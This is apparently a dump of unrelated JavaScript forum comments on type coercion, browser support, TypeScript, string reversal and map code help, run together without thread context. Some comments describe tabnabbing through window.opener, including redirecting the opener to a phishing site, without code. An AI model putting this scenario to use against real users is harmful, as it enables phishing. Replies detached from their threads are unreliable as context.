You can coerce string type values in to number type values with the `Number()` wrapper object. If the coerced value cannot be converted to a number, then `NaN` is returned. Example: var tTT = "3.33"; console.log(typeof tTT); //string tTT = Number(tTT); console.log(typeof tTT); //number
you can not write a JS application that is installable locally on all operating systems that can simultaneously work in a browser and expect it to have the same access to the same system resources. Which is NOT A BAD THING and browsers should not be encouraged to let websites access your underlying system. That's certainly a recipe for disaster. 
Thanks, useful!
With Microsoft finally pulling the plug on old IE versions, I get that same familiar IE feeling when I'm about to bring up a site in Safari. It's amazing how many things are just flat broken.
I can keep going with this and say that perhaps the problem extends into writing the package manager in the language a runtime executes and for a specific version of that runtime, but what I'm trying to get at is that I believe `npm` is flawed and doesn't make use of any prior research into how other package managers work. QED it's now necessary to have a LTS version of `npm` because of how the project is maintained and managed.
bhahahaha! Finally ran out of shit to talk, huh? we're done, move one. Better luck next time
It's not that it is bad, or getting worse. It's just not changing as fast as everyone else. I remember when Safari was not only the fastest, most accurate-to-spec browser, but it also updated more frequently than most. That all changed with the industry's switch to transparent upgrades monthly or even more frequently. Now software that is upgraded once or twice a year is "obsolete" and "the next IE". How long was IE 6 around before it died? Oh, it's still in use in huge percentages in Asia, huh? To answer your question, Safari will get faster updates when they switch to a faster updating development model. Since their main focus is battery performance lately, I suspect they are aggressively avoiding repaints.
does feathers on react-native require feathers on a server ? can I use feathers on react-native and connect to say a hateaos api ?
Honestly, why did you comment that? This is basically a true successor to JavaScript that fixes the issues from it.
You could try jsPlumb. [https://github.com/sporritt/jsPlumb](https://github.com/sporritt/jsPlumb) 
Well, the current Webkit nightly gets 98% support for ES6 on kangax-github.io. Firefox 48 gets 91%, Chrome Canary gets 98%, MS Edge 14 gets 86%. I'm pretty sure all the great ES6 support in Webkit nightly will make it into the next Safari this September. So although the current Safari's support for advanced ES6 is not good, it will get better come Safari 10. Webkit is also make huge strides implementing the new shadow DOM API with slots, and custom elements, as well as CSS grids. 
&gt; Hactar parses your code, figures out what you are coding, then installs, configures, and writes code to make it work. Sounds pretty nice. though i would never use it. thanks to the [lessons](https://en.wikipedia.org/wiki/Murphy%27s_law) i have learned as a coder 
Awesome! Feel free to message any of us directly if you don't get a response right away... We look forward to seeing you in the weekly focuses! :)
How would you do both? Since this would have to be in the HTML, would you add `rel=noreferrer,noopener` or is that invalid?
This code looks bad
Vue is the only framework I use. I came from a jQuery background (with some Angular familiarity), and Vue was very, very simple to pick up.
You need to add a enctype=multipart/form-data to your form in order to support file uploads. http://stackoverflow.com/questions/1342506/why-is-form-enctype-multipart-form-data-required-when-uploading-a-file
i like turtles
Can no longer view source to see how something works.
GET requests that modify state are Evil. Search engine spiders, prefetching browsers and link stealing plugins/malware will trigger these without click. The prefetching browsers might even send your cookies for extra damage potential.
Your render method for one. for(let _ of text.match(new RegExp('\\' + this.tag.first + '(.*?)' + '\\' + this.tag.last,'g'))){ let key = _.replace(new RegExp('[\\' + this.tag.first + '\\' + this.tag.last + ' ]','g'),''); This code is super confusing, not to mention a line below the let you have three nested if statements. Thats just bad practice all around. They can be turned into if x and y and z then do what ever. Another thing, thats isn't messy but a thing we don't do in JS is `==`, we always do `===` You also have this inner text and text content where you are replacing something with something, which isn't even clear what you are replacing with what you want to replace it by. Next, as I trace through this jumbled mess, you have the following: else do something else { do soemthing No ... Stick with one format or the other. Do not mix formats. Now that I see you have else statements for the three if statements, create three separate functions: if something { return x; } else { return y; } This reduces the complexity in your for loop. Other then that your code is undocumented as to what it does, It makes little to no sense and you use rejex with out at least explaining what you are doing. I would SEVERLY rethink this approach to what ever problem you are trying to solve.
Meh, if your site can be hacked by a GET request and/or POST requests without a security token, then any third party can do anything they want anyways. If you don't use cookies, but JSP URL rewriting like "./some.jsp;2434234234" then chances are the next Bobby tables would break your site unless it is broken to begin with.
Yes, for example an API endpoint - mainly for mobile apps. You've no idea what host will the client connect from. Almost never needed/a good idea for normal websites though.
~~Security risk? How? This is no more invasive than opening the inspector, isn't it?~~ ~~I suppose it's actually the attacker opening the inspector, but if there was anything worth taking in the page, we've already lost, haven't we?~~ ~~For this to be a problem, there'd have to be plaintext secrets on the page &amp; the user would have to follow a link. I guess maybe Chrome might autocomplete a password field and then attacker grabs it? Or maybe attacker injects credit card fields, waits for auto complete, then takes them?~~ ~~Maybe~~ it is a problem~~. But a weird one.~~
Interesting points, thank you. Here's the thing though - if you're serializing a schema referencing arbitrary code, is that really a complete schema without including that code? Say you update the `customEmail` function, how will that be reflected in the serialized version of the schema?
thank you so much.
I can't figure out what's going on with your code... To me, it seems like it should run in an infinite loop and crash the browser, but when I run it in CodePen... it doesn't. I don't know... So the best I can offer you here is help with the concept of recursion, which is basically a function calling itself. Here's a simple example: http://codepen.io/anon/pen/mPOGPM?editors=0012 Does that make sense? Hopefully someone will come along and explain to us what's going on with your function there...
Please stop spelling 'lose' as 'loose'. Loose means 'not tight'. You dont go off telling people that they are loosers as well, right?
amazing!
Sooo... Now I'm just trying to think of a site that could be interacted maliciously with window.location.hash and I'm pulling a blank. Any ideas? Edit: I didn't think of this initially but I'm not trying to exploit anything, I'm really just trying to understand how that could be used maliciously at all.
Wew ok...can't tell if that is good or bad :| But thanks for checking out the experiment!
I don't think there are any major websites that have obvious vulnerabilities with `window.location.hash`. This is a prime example of [csrf](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet), which is one of the best known attacks. There also isn't really anything special about the hash that make it more vulnerable than any other part of the URL. If you want to try to exploit this then your best bet are single page apps (especially those supporting IE9 or below). There's a good chance they use the location hash for navigation between pages, and these are therefore most likely to contain a vulnerability somewhere.
Hah. On my desktop now. It only rendered the initial grid (or zoomed in all the way) on the iPhone, that's why I was getting weird results, but it works as intended in Chrome and Firefox. Although there is a bit of flickering in Chrome, but I don't think that's your fault.
What is the appeal of Meteor? edit: nevermind, there is another thread a page down https://www.reddit.com/r/javascript/comments/4a9glf/thoughts_on_meteor/
I suppose you're right.
If someone could create a `mobx-connect` where you can define what to pass to context based on `ryan`, that would be great.
Yes. 1) you already seem to know basic html, and at it's simplest, React+JSX is a way to render out HTML components in a relatively straightfoward, non-complex way. 2) regardless of anyone's opinion about it, it's very much the approach in demand and 3) in learning it, you'll start to incrementally pick up on the most up-to-date best practices in the language today, since there's so much current, present-day activity. Older tutorials and approaches might not do that for you.
But typeof NaN === number I think we've been had.
wasm does have a textual format that you can view source with, and it supports source maps back to whatever language it came from. And really, that's no worse than the current practice of minifying javascript.
Wait.. what? So reading window.opener.location cross-domain is blocked (as it should be), why the hell is setting it allowed?
On the same domain, sure, but it should never be allowed cross-domain. This is crazy.
&gt; it should never be allowed cross-domain I just think they need to implement postMessage between them instead.
I thought with there was never breaking changes so that legacy javascript will always run?
Ahh, yes makes sense. Just redirect the opener to a phishing site and collect money.
have you tried splitting the string into an array and using: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/Reduce
I don't think it does, unless you redraw that image. Is this what you're talking about? https://jsfiddle.net/rww9pexz/
http://pastebin.com/pgZZ1pJ4 This shows a picture of a cat, a src I added AFTER I drew the image to the canvas. EDIT: Same result on four browsers, though on some the image of the dog shows briefly. EDIT2: I noticed you used a DOM image, while I used a dynamically created new Image(). That could account for the differing results.
Oh, of course! That explains it, thanks!
Read the article 
At work we were discussing one of our sites which has hundreds of user accounts linking off to the users' SMB sites. We have vetted users, and their submissions are validated, so no scripts should be there. But the scenario we came up with was if one of their sites were hacked, script could be added that checks window.opener and logs valid ones, then later add code to the owned site for a custom attack. That's a pretty unlikely scenario, but definitely possible. 
Great article!
`window.opener` is how you ref the parent when you postMessage with what ever result you were opened for. The `window` object maybe should have some stuff undefed when its cross origin though. IIRC opener.location will be write only at least.
Will do, cowboy. Wouldn't want you to loose your mind over a typo ;) Edit: Shit! I forgot that comma. That edit was for you, cowboy. 
The thing that has always worried me about tests is their coverage. I am not talking here about just test coverage which simply checks to see if every line of code has a test. I am more concerned that the test themselves are often superficial and only test simple test cases, not the most complex issue. When I discuss testing with my students I say that tests need to cover the following: * Expected data * Extreme end of the expected range of data * All possible data outside the expected range of data * Anything else you can think of that might possibly happen Of course unit test can't cover the fourth case, but they should cover the first three. TDD does this but the coverage tools do not.
I'm not 100% certain what AliasCmd is, all I've found on it is [this.](https://github.com/tylerjwatson/Jist/wiki/AliasCmd-specific-functions) It says that I need to have AliasCmd, which at first I assumed was another tShock plugin, but I can't find any plugins like that anywhere so maybe not. I "made" the script using [these](https://web.archive.org/web/20150327102334/http://plugins.tw.id.au/topic/5/seconomy-ranking-script-v2-0) instructions.
reddit does a fun little song and dance with JavaScript to work around this security bug: https://github.com/reddit/reddit/blob/6ad231b2ea9dde771f6879c2db77e1e351ddfae1/r2/r2/public/static/js/ui.js#L57-L78
You might want to compare and contrast it against something like [rewrite](https://github.com/jhnns/rewire) (which has a [webpack plugin](https://github.com/jhnns/rewire-webpack)). There's another approach that doesn't require any kind of library or anything, either, but it does involve modifying your code. Like this (example from OP's post): import { name } from 'models/user'; export class Navigation { greeting() { return name() .then(name =&gt; { return name ? `Welcome Back, ${name}!` : 'Welcome!'; }); } }; To: import { name } from 'models/user'; export default class Navigation { greeting(getName = name) { return getName() .then(name =&gt; { return name ? `Welcome Back, ${name}!` : 'Welcome!'; }); } }; Then in your unit test, simply: import Navigation from 'nav'; var nav = new Navigation(); expect(nav.greeting(() =&gt; Promise.resolve('foo'))) .to.eventually.be('Welcome Back, foo!'); expect(nav.greeting(() =&gt; Promise.resolve())) .to.eventually.be('Welcome!'); Though the use of a class in the example is totally unnecessary (should just be an exported function), you can do the same thing with a class's dependencies in its constructor: export default Navigation { constructor({ getName = name }) { this.getName = getName; } greeting() { this.getName().then( ... ); } }
Custom types are great for when you're in control of both the data ingestion side that houses the schema definition and the data creation side that wants to read it. In this case, you can separate your type definitions into a shared module that both systems can use -- or, in the most minimal use case, pre-share which types are a string base, which are numbers, etc., if that's enough to support your needs. In the event that you _aren't_ in control of both ends and it's prohibitive to share information about the custom types, you can simply stick with the native types (string, number, etc) and still have all the functionality that you'd get out of other popular validation libraries.
&gt;function saveAndRedirect() { NWF$('.saveButton').click(); window.location.replace(URL); } This code is Javascript (Jquery actually) and run two commands NWF$('.saveButton').click() and window.location.replace(URL) window.location.replace(URL) redirects to the URL, which you say works. Without seeing the rest of the code base it is not possible to say what the other command does. In Jquery: $('.saveButton').click() will run the click function that is associated with the css class saveButton 
For the css class saveButton I can't access the code base but the built in button action is set to Save. I changed the code to be &amp;nbsp; function saveAndRedirect() { NWF$('.saveButton').click(); window.close(); } &amp;nbsp; and the outcome was exactly what you would expect it to be. The form saved to the SharePoint list database and then the window prompted to close so I'm not sure why the saveAndRedirect option isn't working when save and window.close does work. I spent a good hour+ on the phone with one of the tech guys too but he wasn't able to work it out either. 
Yeah, the hack is working for me, now, too. Most likely I was just being an idiot and clicking the "safe" link, thinking it was the "hack" link, although I did double-check myself before posting here, of course. On the other hand, I had just been awake for about 40 hour straight at that point, so that might have been a factor. There is another possible explanation of what was happening here, but it's a long story and there's a 90%+ chance that I was just being an idiot, so I'm not going to tell the long story.
&gt; It's not that it is bad, or getting worse. It's just not changing as fast as everyone else. In the world of web browsers that **is** bad. It's failing to keep up with the competitors and adopt new standards in a timely fashion, and a browser that doesn't update and falls behind *is* getting worse every single day. The IE6 analogy is an apt one - IE6 was *amazing* when it first came out. I was a huge Netscape/Mozilla fanboy, but IE6 just buried both of them and won the first browser war for Microsoft, hands down. Cut to five or ten years later, however, and IE6 was an embarrassing shit-pile *because it didn't get updated*... and IE continued to be the slow kid who sits at the back of the class and eats glue right up until somewhere around 10 or 11. "Saving battery performance by aggressively avoiding repaints" is an *explanation* for the behaviour, but it's not an *excuse*. That kind of shit is a browser bug, period. And a browser which makes a habit of including that kind of crap is a *buggy, bad browser* - end of story.
You should create a PR for https://github.com/sindresorhus/refined-github
So Reddit is just fucked?
r-r-r-rekt
I don't get it. Options are a great thing, having so many tools at your disposal for free is one the greatest things as a developer... why the fuck are people complaining? Grow up and decide for yourself, if you always follow others you will have this effect in more areas than just Javascript. 
that is not how all the great tools we have today were invented but i guess if it works for you...
Thanks a lot for the links and the suggestion. I actually have spoken with a couple classmates and taking your advice.
This is awesome!
why do you want to use jsx if you are not using react?
Hahahahaha no. Jsdoc, problem solved
and new problems created. (not that typescript is problem-free)
I hope that author will not burn-out and will finally find founding for that awesome project. 
Well, not very likely. Though I do kind of wish all libraries included .d.ts files. They benefit TS and JS devs.
I think you're overestimating how much of an extra effort TypeScript is. If only the arguments of your API are typed, most Javascript developers probably won't even notice, while still being an enormous help to your library consumers :)
Unfortunately i need to bother you again. I've been noticing now that a few examples of javascript havent been working when ive come to use them, but i dont understand why. Im using xampp locally, and theres plenty of stuff that has been working, certainly jquery but just creating a blank document and using: &lt;script type="text/javascript"&gt; foocounter = 0; var foo = document.querySelector('#foo') var myfield = document.querySelector('#myfield') foo.onclick = function(e){ e.preventDefault(); var groups=['admin','public','members']; foocounter++ if (foocounter &gt;= groups.length) foocounter = 0 var group = groups[foocounter] this.innerHTML = group myfield.value = group alert('hidden field val is now:' +myfield.value) } &lt;/script&gt; &lt;button id="foo"&gt;Something&lt;/button&gt; &lt;input type="hidden" id="myfield" value=""&gt; I seem to be getting the same results on my hosted server too, im guessing im doing something wrong with the js code? \+ happy cake day :D
Disclaimer: I’m co-organizing this conference. We focus on community-building, via relatively cheap tickets, short talks (25 minutes and 9 minutes) and a pleasant atmosphere that is conducive to communication.
Well ok then.
Let me save y'all the trouble. The page is just a code snippet of an object that collects callbacks, and can then call every one of them with a given value. Here's a simplified version of the code posted there (which quite literally is the only thing on the page): class Dispatcher() { constructor() { this._callbacks = []; } // add a callback to our list of callbacks register(callback) { return this._callbacks.push(callback) - 1; } // call every callback with a given value dispatch(value) { for (var i = 0; i &lt; this._callbacks.length; ++i) { this._callbacks[i](value); } } }
You literally cannot do that in JavaScript, though, as strings are immutable. The first one actually makes two copies of the string (first as an array and then as a string again). The second I think theoretically makes N copies of the string where N is the number of characters. The third makes something like N*2 strings total: 1. "h" 2. "e" 3. "l" 4. "l" 5. "o" 6. "ol" 7. "oll" 8. "olle" 9. "olleh" I *believe* that's how that would work. Of course, I'm sure the compiler/interpreter is smart enough to realize when you do something like += to a string that has only one reference, so in practice this doesn't really matter, but the point is that there are no "in-place" solutions&amp;mdash;and there never can be in JavaScript.
[2 is faster than 3 which is faster than 1](http://jsperf.com/reverse-string-sonya-moisset/2).
Var x = "string"; x = x.split("").reverse().join("") X now equals "gnirts" Instead of reading an article, a better way to learn tricks like this is to play coding challenge games like "coderbyte" or the "kata" one (can't remember what it's called). Complete a challenge then look at the top answers to see how someone else would do it. I've seen some very clever solutions! 
Unicode support, good thing. Unicode identifiers. [Bad Thing](http://www.globalnerdy.com/wordpress/wp-content/uploads/2014/06/poopy-swift-code-example.jpg) (Example is from Swift)
My head sort of explodes when using decrementing for loops. You could always modify 2 to be a standard incrementing for loop and change line 11 to ``newString = str[i] + newString;``
&gt; Options are a great thing It's been proven that this is *wrong*. Instead of linking to the plentiful scientific literature (contexts: everything from marketing to government policies for example for 401K or health insurance plans) which few will read and which [Google Scholar](https://scholar.google.com/) can dig up for you, here's a more easily digestible TL;DR: http://www.ted.com/talks/barry_schwartz_on_the_paradox_of_choice Here's two hints: If choice is so good, why have standards? If everybody could have their own screws and nails and shipping containers and APIs and.... - wouldn't the world be a better place? Obviously not. That's about interoperability (training/learning of people belongs there too), the other one is about the *personal cost* of those having to choose. Those emphasizing the differences between various frameworks, libraries, databases etc. remind me of a certain kind of trickery with statistics: When you have sets of results that don't look much different on an absolute scale, simply switch to a relative scale and you can magnify the differences until they take up the entire screen! A difference of 1% on a 0-100 scale: tiny, but use a 0-2 scale and show just the difference and not the "big picture" and it looks huge. People like to blame it on the technology when broken teams, broken organizations, broken requirements, a *broken system* has *far* more responsibility for the outcome - but of course, it is *much* harder to change (often impossible from an individual's point of view), so a human tendency in such cases is to look for the next ting that could easily be changed, even if it actually has very little influence on the outcome. 
As someone who maintains a typescript library, I wouldn't advise it until they sort out distribution of dts files and managing dts dependencies. Typings is a step towards that but still not good enough.
I'm sorry but TypeScript is JavaScript with type annotations. At its core there's still JavaScript. There's no new syntax on the level of CoffeeScript. If you can't handle a slightly modified JavaScript syntax (as a self proclaimed JavaScript developer no less), then frankly you're an idiot. Typed JavaScript couldn't be done any simpler.
https://jsfiddle.net/mpf5b7v5/ use the 'change' event then switch based on the value foo.addEventListener('change', function(e){ var val = e.target.value var data = { bedforshire: { latlong: [1,2,3], bounds: [1,2,3] }, ...} // this goolefu( data[val].latlong ); googlefu.bounds.extend( data[val].bounds ); // or this switch(val){ case 'bedfordshire': googlefu(whatever); break; case 'javascriptshire': googlefu(whatever); break; } })
Right codewars. I couldn't remember the name of that one, thanks!
Brilliant, thank you. I'd never in a million years have thought it was the other way around, i very rarely use it but when i have i've always linked to it with css files etc. Having quickly googled javascript ready function, and looking at one of the scripts thats working fine called at the top of a page, i see its got that code, so thanks for also pointing that out to me, it might help save me from asking similar questions or moving on from perfectly good examples of code that havent worked when ive tried them myself.
There you go is that better! :) thanks for the tip. I cannot see your way to add functionality?
The point of TypeScript is to enable type annotations, that are enforced by the compiler. JSDoc might do the same (I don't know), but that alone doesn't make it better, merely equal?
so the $(' blah ') selector works like this: * `#id`: find by id * `.classname`: find by class (ex &lt;option classname="bedfordshire"&gt;) * `div`: find elements `&lt;div...&gt;` * `a,b,option`: find html tags: a and b and option so it should be $('option'), and Im not sure option tags even get click events instead i would use the `&lt;select&gt;`'s events, specifcally the change event ex: document.getElementById('counties').addEventListener('click', function(e) { switch(e.target.value){ case 'bedfordshire': bounds = new google.maps.LatLngBounds(); bounds.extend(new google.maps.LatLng(52.33, -0.05)); bounds.extend(new google.maps.LatLng(51.8, -0.8)); map.fitBounds(bounds); break; case 'buckinghamshire': bounds = new google.maps.LatLngBounds(); bounds.extend(new google.maps.LatLng(52.21, -0.33)); bounds.extend(new google.maps.LatLng(51.47, -1.33)); map.fitBounds(bounds); break; case 'cambridgeshire' : bounds = new google.maps.LatLngBounds(); bounds.extend(new google.maps.LatLng(52.75, -0.55)); bounds.extend(new google.maps.LatLng(51.99, -0.53)); map.fitBounds(bounds); break; case 'hertfordshire' : bounds = new google.maps.LatLngBounds(); bounds.extend(new google.maps.LatLng(52.09, -0.35)); bounds.extend(new google.maps.LatLng(51.59, -0.80)); map.fitBounds(bounds); break; case 'northamptonshire': bounds = new google.maps.LatLngBounds(); bounds.extend(new google.maps.LatLng(52.67, -0.33)); bounds.extend(new google.maps.LatLng(51.94, -1.35)); map.fitBounds(bounds); break; } }); you can reduce the amount of code by doing bounds = new google.maps.LatLngbounds(); switch(e.target.value){ case 'bedfordshire': bounds.extend(...); bounds.extend(...); break; case 'cambridgeshire': //etc } map.fitBounds(bounds) and even further reduce it by using an object to store the latlang like the above post
why are we doing -1 in `return this._callbacks.push(callback) - 1;`
Yes! Read the comments in the JS: http://codepen.io/anon/pen/pyRvLm Make sense?
My favourite: [].reduce.call('someString', function(x, y) { return y + x }) ^^something ^^something ^^es6 ^^arrow ^^functions
To add on to what /u/abdelhai mentioned, it's got more features and is more extensible.
The way I read the article, it's saying that with JavaScript you can write once and deploy everywhere, and with things like NativeScript for example, a button will translate to its native equivalent when deploying to a particular device. It does not mention allowing the browser to access native features. I share your point, but that's not the point of the article. 
another way to do the recusion. function reverseString(str) { var chr = str.slice(-1); if (!chr){return '';} return chr + reverseString(str.slice(0, -1)); }
All three methods offered are broken for strings containing characters outside of the BMP - like emojis. In the authors defense: Reversing such a string was practically impossible in all versions of JS before ES2015.
Ya, I'm there too. DevChat welcomes both backend and frontend devs. (NodeJS/Python/DevOps/DB)
So far, my favorite thing about slack is posting code snippets. While it's not too hard to post something to pastebin, it's quite nice to have an expandable box with code directly in the chat box. edit: Actually, now that I think about it, my favorite thing is having a good mobile app. Code snippets come second :) 
Well, on Chrome at least, prepending is quicker. Or maybe incrementing a for loop is quicker. http://jsperf.com/prepend-vs-append-in-string-reversal/3 Edit: It seems like prepend and append are more or less the same. But a decrementing for loop is slower than an incrementing one.
for(var i=5;i--;){} My favourite ^^
That was brilliant thank you
was that a subtle attempt at saying "react is wrong"? because i don't think they were targeting mithril for going html-in-js route. 
Hi MaxKK Would you mind elaborating a bit on what kind of developers you are looking for? Do you have certain applications in mind? Thanks!
&gt; To drive that point home, tautologies are tautologies. To drive that point home, something true is true.
if your objective is just to replace elements in dom, wouldn't mithril be better? if it is about having xml like tags, then vue would be another alternative. 
You call it type annotations but it really is just a source code comment. I would write the TypeScript team asap and tell them about this unique way of annotating your source code. You're onto something.
But Typescript is pretty nonintrusive, _and_ offers better support for _Javascript_ users (as their editors can autocomplete the library's API). And it's better than JSDoc because it's actually embedded in your code, meaning it cannot become outdated.
The main reason is that the library's users get autocomplete for the library API, even if they're not using TypeScript.
[Error Codes](https://developers.google.com/maps/documentation/javascript/error-messages#errorcodes) &gt;The script element that loads the API has no API key. Please make sure you include a valid API key as a key parameter. You can generate a new API key on the Google Developers Console. https://developers.google.com/maps/documentation/javascript/get-api-key 
Turns out to be a pretty interesting thing, not stupid at all. From [Array.prototype.reverse](https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Global_Objects/Array/reverse) on MDN: &gt; The reverse() method reverses an array *in place* Since strings are immutable in JS, an engine throws an error.
JavaScript fatigue fatigue.
While yes, technically TS is a superset of JS, just changing the extension is not what people mean when they say that they develop in TS.
I agree this is the best description, but I'd rather smarten up my html than dumb down my javascript.
My post is an explanation of what it is and why you get it. Not another OMG I'M FATIGUEDDDDDD!! or I'M FATIGUED BY FATIGUES OF BEING FATIGUED BY JAVASCRIPT FATIGUE I QUIT THE INNERNETS!!
Then you're doing your job right. Congratulations there's literally dozens of us!
Programming language is not a religion (ofc a lot of people treat it as such). While it is a good idea to adopt and disseminate good approaches, there is no point push for the monotheism of programming languages. I like TypeScript, Flow, and the type systems they offer. There are scientific studies that establishes that a Type System improves productivity for many programming tasks (e.g. [this study](https://dl.acm.org/authorize.cfm?key=6743202)). Those facts shouldn't stop us from exploring other ideas and approaches that can accomplish the same goals (e.g. alternative type systems, language-based immutability). 
[Modular JS](https://www.youtube.com/playlist?list=PLoYCgNOIyGABs-wDaaxChu82q_xQgUb4f) [Javscript Design Patterns - Addy Osmani](https://addyosmani.com/resources/essentialjsdesignpatterns/book/) [MDN - javascript](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
"Which would pass, but the coverage reporter would bark at the untested if(val) branch." Uh... yeah. So this is the entire point of coverage tools; ensure that you are testing every line of code. If that code does nothing - is not intended to have any side effects - then *it should be removed*. This is a very valuable part of code coverage tools; it identifies the very real need to test all cyclometric paths. If you don't think you need to exercise that path, then you should be able to remove it without issue. Otherwise you aren't testing all of your code. 
LOL i actually read the PNG Idat chunk articles one months ago and tried it on some of my websites and it worked but i actually never believed it could work on a website like Facebook
You can distribute both both Typescript original source and compiled JS source. You won't need Typescript to use the library.
Why not Facebook Flow? Flow is actually annotated JS, as opposed to Typescript which generates JS code from its own language. Flow does not generate any JS code. All you need to convert Flow code to pure JS is remove the annotations.
I'm building my js apps in the SAM pattern so jsx just fits really well without the unnecessary stuff of other libraries. I've done a few experiments with vue with the SAM pattern, while it works I could see potential pitfalls due to two way binding whereas SAM is a one way data flow. 
Yeah... I'm no pro or anything, so take this with a grain of salt, but... I'd say just start in on it and come back to reddit or go to Stack Overflow or just Google around for specific answers when you get stuck. Again, I'm no pro, but feel free to message me if you want help with anything specific.
Those aren't elements, they're DOM API's (methods and properties). * [DOM Introduction](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction) * [Document Object Model](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model) * [Window](https://developer.mozilla.org/en-US/docs/Web/API/Window) * [Document](https://developer.mozilla.org/en-US/docs/Web/API/Document) 
If you're using Visual Studio Code...
Of course its intrusive, I don't want to have to transpile my code and use an intermediary stage. Autocomplete? JSdoc and esprima can accomplish exactly that. 
It's not! It's not not a number. :)
So, he complains about loose typing. Guess what, try TypeScript or Flow. He complains about semantics, again try TypeScript. He complains about the difficulty in maintaining JavaScript project with 10s of thousands of lines of code (LOC), again, try TypeScript. Not sure his complaint about JavaScript arrays. We do have typed arrays that solve most of his complaints. Then there are the new ES6 (ECMAScript 2015) data collections: map, weak map, set, weak set. He sounds like an attention-starved whiner. If he doesn't like JavaScript, then please do go use whatever turns your crank.
You'll have a much easier time using promises
Ugh, I tuned out when he showed the "graphic" of *Javascript: The Definitive Guide* vs *Javascript: The Good Parts*. It's cute as a joke, but shoving it into a serious article to illustrate your point is a huge "I'm just bandwagon jumping" flag to me. &gt; So why do JavaScript proponents continue to promote its use? &gt; The answer is: JavaScript’s large user community and ecosystem of tools and libraries, not to mention the large number of jobs available for JavaScript developers. NO! THAT'S NOT THE FUCKING REASON! People promote the use of Javascript because it's the only language that can run everywhere. They promote it because it's a foundational aspect of web development, so promoting the web necessitates promoting Javascript (or at least a language that compiles to it). And it spread from there due to the desire to reuse the mountains of code being written for the web. Node JS didn't become popular because people liked Javascript, it became popular because it promises to allow developers to reuse the same code on the client and on the server. And React became popular partially because of the promise of React Native, because if you're writing a front end for your website, wouldn't it be awesome to reuse some of that code in your app without making the sacrifices necessary to use WebViews? Having a common codebase, having all of your developers on disparate platforms literally and figuratively speak the same language, holds enormous promise for productivity and code reusability. In some ways, JavaScript is delivering on the promise that Java failed to deliver on 15 years ago. THAT'S why everyone still uses it. Because it's uniquely situated to do what no other language is currently capable of. Whining about it accomplishes nothing, because there is currently no viable replacement unless you're compiling to Javascript at the end of the day, so use TypeScript or CoffeeScript which address most of the concerns in this article and stop complaining. This will all be moot if Web Assembly can get traction anyway, since I have no doubt that every language under the sun will try to compile to it if possible, at which point it will remove Javascript's primary advantage and likely become the de facto lingua franca of programming.
X-Post referenced from /r/reactjs by /u/prtkgpt [How to build a dashboard in react.js](https://www.reddit.com/r/reactjs/comments/4ap9n9/how_to_build_a_dashboard_in_reactjs/) ***** ^^I ^^am ^^a ^^bot ^^made ^^for ^^your ^^convenience ^^\(Especially ^^for ^^mobile ^^users). ^^P.S. ^^negative ^^comments ^^get ^^deleted. ^^[Contact](https://www.reddit.com/message/compose/?to=OriginalPostSearcher) ^^| ^^[Code](https://github.com/papernotes/Reddit-OriginalPostSearcher) ^^| ^^[FAQ](https://github.com/papernotes/Reddit-OriginalPostSearcher#faq)
Hello, We offer a SDK/framework for JS developers to develop blockchain-based, decentralized applications. Same as Angular or React, we also are looking for developers who use our framework to develop great things. If you want to get involved and just looking around for possible ideas you should check out the participants from our last idea contests. There you have 39 use-cases. https://blog.lisk.io/announcing-the-dapp-idea-contest-winners-94784e36545c#.y29nqsod0 If you are seriously interested, please PM me and I will send you my Skype ID. I will explain Lisk to you then. :)
&gt; what would be the alternative? Don't fall for [bike-shedding discussions](https://en.wikipedia.org/wiki/Law_of_triviality)? Note that I didn't (and would not have) responded to OPs topic, but your claim is a well-researched issue that's actually interesting, there's a reason why "choice" was study so broadly and thoroughly. This was what I responded to, and *only* this: &gt; Options are a great thing I'm too busy programming for that other stuff. And I'm just a "programmer", without any language or "framework" in front of the term. Sure there are legitimate and interesting discussions - but not the kind "is water useful or is it too wet?" It's just a **bullshit** discussion if there isn't a more **specific** context. 
http://dev.tedx.amsterdam
I don't know exactly what this code is doing. You have a function called "initMap()" that I'm guessing initializes your map. So I'd give it a try to replace: google.maps.event.addDomListener(window, 'load', initialize); with google.maps.event.addDomListener(window, 'load', initMap); But there could be a hundred bugs in that code that prevent the map from loading. Edit: I made a little pastebin with code that shows a map: http://pastebin.com/CdFC2uVM. There is a local file you're referring to that is missing, obviously.
ES6 Classes did approximately nothing to change JS's core OOP capabilities. It made existing patterns much more syntactically convenient, among other things, but just because there's a class keyword that is new doesn't mean JS is now a "class-based" language and not a "prototype-based" one. It's still the latter.
Its a super simple app (so they say) we submit all the files and the marker basically just opens them individually to view the html doc and the js doc and also runs it in chrome. Basically have to make a small application that allows a 'decorator' to input criteria for a room they are decorating. So, wall area, window area, materials used, cost per roll/tin etc and display all current jobs in a table format i guess, then cost etc etc. So there has to be an input form, then a list of whats already been established. Im mostly struggling with design doc terminology at the moment as i dont know what functions exist built in with js and what i can create myself, or even how to do that. Its just all a bit stressful at the moment. Thanks for your help though, i'll give this a proper read tomorrow again when i'm back working on it! 
This video comes from the March Austin, TX ReactJS and React Native Meetup. On the page linked, you can go directly to the code, slides, or watch the video. If you like the presentation and are in the Austin area, consider joining our [Meetup](http://www.meetup.com/Austin-ReactJS-Native-Meetup/)! We have had 2 meetings so far and are currently planning our next event!
I like the &lt;marquee&gt; element a lot
if you're building a page crawler: document.links &lt;-- all the links in a page document.comment &lt;-- all the html comments 
an es6 class is just shorthand for creating an anonymous closure. the only difference between declaring a class and wrapping an object in a function is that classes have a "constructor" method whereas functions require that you do "this.prototype.constructor" to get the same functionality.
Ok, that gives me a good idea. Here's a link with some sample code I put together. This is from a site (jsfiddle) that allows easy sharing of examples/code. You can copy the JS and HTML into your own files as you see fit. The first thing you should do is get an editor (essentially a text-editor that has rules (proper syntax control)) like sublime text editor. Then you can create the files you need and to test them, all you have to do is open the HTML file locally (your default browser should load it automatically, such as chrome/IE/firefox/etc). Once you get your own local files setup you can mess around with them and go over how I used CSS to style the fields, setup the HTML elements to support a few questions/input fields (you can duplicate these as you see fit) and then also added some buttons at the bottom that you can use to trigger JavaScript functions (where you can submit/manipulate the fields accordingly). This should give you an ok-starting point and since this is a 5-week project, I'll leave the JS portion fairly blank so you can start looking into things like 'how to get the value of an input field', etc. Let me know if you have any other questions - good luck! https://jsfiddle.net/tn4yr46L/6/ 
